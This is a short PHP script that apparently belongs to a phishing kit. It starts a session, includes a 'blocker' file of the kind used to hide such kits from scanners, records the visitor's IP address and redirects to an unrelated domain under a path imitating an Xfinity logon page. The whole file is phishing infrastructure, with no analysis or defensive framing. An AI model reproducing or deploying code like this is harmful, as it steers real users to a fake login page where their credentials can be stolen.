<?php
session_start();
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

header("Location: https://support.cyberesa.net/css/images/xfinity/logon/s/");
?>